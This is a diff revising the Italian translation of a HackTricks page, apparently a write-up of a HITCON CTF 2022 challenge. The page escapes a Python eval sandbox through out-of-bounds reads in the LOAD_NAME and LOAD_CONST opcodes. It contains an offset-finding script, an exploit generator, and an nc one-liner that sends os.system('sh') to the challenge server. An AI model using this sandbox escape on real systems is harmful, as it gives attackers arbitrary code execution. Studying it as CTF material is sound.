@@ -1,26 +1,27 @@
-# LOAD\_NAME / LOAD\_CONST opcode OOB Read
+# LOAD_NAME / LOAD_CONST opcode OOB Read
+
+{% hint style="success" %}
+Impara e pratica l'hacking su AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Impara e pratica l'hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Sostieni HackTricks</summary>
 
-Altri modi per supportare HackTricks:
-
-* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
-* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
-* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
-* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) **e** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repository di Github.**
+* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Condividi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.
 
 </details>
+{% endhint %}
 
 **Questa informazione è stata presa** [**da questo articolo**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**
 
 ### TL;DR <a href="#tldr-2" id="tldr-2"></a>
 
-Possiamo utilizzare la funzionalità di lettura OOB (Out-of-Bounds) nell'opcode LOAD\_NAME / LOAD\_CONST per ottenere alcuni simboli in memoria. Ciò significa utilizzare un trucco come `(a, b, c, ... centinaia di simboli ..., __getattribute__) if [] else [].__getattribute__(...)` per ottenere un simbolo (come il nome di una funzione) desiderato.
+Possiamo utilizzare la funzionalità di lettura OOB nell'opcode LOAD_NAME / LOAD_CONST per ottenere alcuni simboli in memoria. Ciò significa utilizzare trucchi come `(a, b, c, ... centinaia di simboli ..., __getattribute__) if [] else [].__getattribute__(...)` per ottenere un simbolo (come ad esempio il nome di una funzione) desiderato.
 
-Quindi basta creare il tuo exploit.
+Poi basta creare il proprio exploit.
 
 ### Panoramica <a href="#overview-1" id="overview-1"></a>
 
@@ -31,15 +32,15 @@ if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
 code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
 print(eval(code, {'__builtins__': {}}))1234
 ```
-È possibile inserire del codice Python arbitrario e verrà compilato in un [oggetto codice Python](https://docs.python.org/3/c-api/code.html). Tuttavia, `co_consts` e `co_names` di quell'oggetto codice verranno sostituiti con una tupla vuota prima di valutare quell'oggetto codice.
+Puoi inserire del codice Python arbitrario e verrà compilato in un [oggetto codice Python](https://docs.python.org/3/c-api/code.html). Tuttavia, `co_consts` e `co_names` di quell'oggetto codice verranno sostituiti con una tupla vuota prima di valutare quell'oggetto codice.
 
-In questo modo, tutte le espressioni che contengono costanti (ad esempio numeri, stringhe, ecc.) o nomi (ad esempio variabili, funzioni) potrebbero causare un errore di segmentazione alla fine.
+Quindi, in questo modo, tutte le espressioni che contengono costanti (ad es. numeri, stringhe, ecc.) o nomi (ad es. variabili, funzioni) potrebbero causare un errore di segmentazione alla fine.
 
 ### Lettura fuori limite <a href="#out-of-bound-read" id="out-of-bound-read"></a>
 
-Come avviene l'errore di segmentazione?
+Come avviene il segmentation fault?
 
-Iniziamo con un esempio semplice, `[a, b, c]` potrebbe essere compilato nel seguente bytecode.
+Iniziamo con un esempio semplice, `[a, b, c]` potrebbe essere compilato nel bytecode seguente.
 ```
 1           0 LOAD_NAME                0 (a)
 2 LOAD_NAME                1 (b)
@@ -47,11 +48,11 @@ Iniziamo con un esempio semplice, `[a, b, c]` potrebbe essere compilato nel segu
 6 BUILD_LIST               3
 8 RETURN_VALUE12345
 ```
-Ma cosa succede se `co_names` diventa una tupla vuota? L'opcode `LOAD_NAME 2` viene comunque eseguito e cerca di leggere il valore da quell'indirizzo di memoria inizialmente previsto. Sì, questa è una "caratteristica" di lettura fuori limite.
+Ma cosa succede se `co_names` diventa una tupla vuota? L'opcode `LOAD_NAME 2` viene comunque eseguito e cerca di leggere il valore da quell'indirizzo di memoria inizialmente previsto. Sì, questa è una "caratteristica" di lettura out-of-bound.
 
-Il concetto principale per la soluzione è semplice. Alcuni opcode in CPython, come `LOAD_NAME` e `LOAD_CONST`, sono vulnerabili (?) alla lettura fuori limite.
+Il concetto principale per la soluzione è semplice. Alcuni opcode in CPython come `LOAD_NAME` e `LOAD_CONST` sono vulnerabili (?) alla lettura OOB.
 
-Recuperano un oggetto dall'indice `oparg` dalla tupla `consts` o `names` (che è ciò che `co_consts` e `co_names` rappresentano internamente). Possiamo fare riferimento al seguente breve frammento su `LOAD_CONST` per vedere cosa fa CPython quando elabora l'opcode `LOAD_CONST`.
+Recuperano un oggetto dall'indice `oparg` dalla tupla `consts` o `names` (che è come sono chiamati sotto il cofano `co_consts` e `co_names`). Possiamo fare riferimento al breve snippet seguente su `LOAD_CONST` per vedere cosa fa CPython quando elabora l'opcode `LOAD_CONST`.
 ```c
 case TARGET(LOAD_CONST): {
 PREDICTED(LOAD_CONST);
@@ -61,21 +62,21 @@ PUSH(value);
 FAST_DISPATCH();
 }1234567
 ```
-In questo modo possiamo utilizzare la funzionalità OOB per ottenere un "nome" da un offset di memoria arbitrario. Per essere sicuri del nome che ha e del suo offset, basta provare `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... E potresti trovare qualcosa con oparg > 700. Puoi anche provare ad utilizzare gdb per dare un'occhiata alla struttura della memoria, ma non penso che sarebbe più facile, no?
+In questo modo possiamo utilizzare la funzionalità OOB per ottenere un "nome" da un offset di memoria arbitrario. Per assicurarci di quale nome si tratti e qual è il suo offset, basta provare `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... E potresti trovare qualcosa intorno a oparg > 700. Puoi anche provare ad utilizzare gdb per dare un'occhiata alla struttura della memoria ovviamente, ma non penso che sarebbe più facile?
 
 ### Generazione dell'Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>
 
-Una volta che abbiamo ottenuto quegli offset utili per i nomi / costanti, come facciamo ad ottenere un nome / costante da quell'offset e usarlo? Ecco un trucco per te:\
-Supponiamo che possiamo ottenere un nome `__getattribute__` dall'offset 5 (`LOAD_NAME 5`) con `co_names=()`, quindi basta fare le seguenti operazioni:
+Una volta che abbiamo recuperato quegli utili offset per i nomi / costanti, come _possiamo_ ottenere un nome / costante da quell'offset e utilizzarlo? Ecco un trucco per te:\
+Supponiamo di poter ottenere un nome `__getattribute__` dall'offset 5 (`LOAD_NAME 5`) con `co_names=()`, allora basta fare le seguenti operazioni:
 ```python
 [a,b,c,d,e,__getattribute__] if [] else [
 [].__getattribute__
 # you can get the __getattribute__ method of list object now!
 ]1234
 ```
-> Notare che non è necessario chiamarlo `__getattribute__`, puoi dargli un nome più breve o strano.
+> Notare che non è necessario chiamarlo `__getattribute__`, puoi chiamarlo con un nome più corto o strano
 
-Puoi capire il motivo semplicemente visualizzando il suo bytecode:
+Puoi capire il motivo semplicemente visualizzando il bytecode:
 ```python
 0 BUILD_LIST               0
 2 POP_JUMP_IF_FALSE       20
@@ -92,9 +93,9 @@ Puoi capire il motivo semplicemente visualizzando il suo bytecode:
 24 BUILD_LIST               1
 26 RETURN_VALUE1234567891011121314
 ```
-Si noti che `LOAD_ATTR` recupera anche il nome da `co_names`. Python carica i nomi dalla stessa posizione se il nome è lo stesso, quindi il secondo `__getattribute__` viene ancora caricato da offset=5. Utilizzando questa caratteristica possiamo utilizzare un nome arbitrario una volta che il nome è nella memoria nelle vicinanze.
+Si noti che `LOAD_ATTR` recupera anche il nome da `co_names`. Python carica i nomi dalla stessa posizione se il nome è lo stesso, quindi il secondo `__getattribute__` viene comunque caricato dalla posizione=5. Utilizzando questa caratteristica possiamo utilizzare un nome arbitrario una volta che il nome è in memoria nelle vicinanze.
 
-Per generare i numeri dovrebbe essere banale:
+Per generare numeri dovrebbe essere banale:
 
 * 0: not \[\[]]
 * 1: not \[]
@@ -103,9 +104,9 @@ Per generare i numeri dovrebbe essere banale:
 
 ### Script di exploit <a href="#exploit-script-1" id="exploit-script-1"></a>
 
-Non ho usato le costanti a causa del limite di lunghezza.
+Non ho utilizzato costanti a causa del limite di lunghezza.
 
-Innanzitutto, ecco uno script per trovare quegli offset dei nomi.
+Ecco prima uno script per trovare quelle posizioni dei nomi.
 ```python
 from types import CodeType
 from opcode import opmap
@@ -140,7 +141,7 @@ print(f'{n}: {ret}')
 
 # for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
 ```
-E quanto segue serve per generare l'effettivo exploit Python.
+E il seguente è per generare l'effettivo exploit Python.
 ```python
 import sys
 import unicodedata
@@ -217,7 +218,7 @@ print(source)
 # (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
 ```
-Fondamentalmente fa le seguenti cose, per quelle stringhe che otteniamo dal metodo `__dir__`:
+Si limita fondamentalmente a fare le seguenti cose, per le stringhe che otteniamo dal metodo `__dir__`:
 ```python
 getattr = (None).__getattribute__('__class__').__getattribute__
 builtins = getattr(
@@ -230,16 +231,17 @@ getattr(
 '__repr__').__getattribute__('__globals__')['builtins']
 builtins['eval'](builtins['input']())
 ```
+{% hint style="success" %}
+Impara e pratica l'hacking su AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Impara e pratica l'hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Sostieni HackTricks</summary>
 
-Altri modi per supportare HackTricks:
-
-* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
-* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
-* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
-* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Condividi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) nei repository di github.
 
 </details>
+{% endhint %}
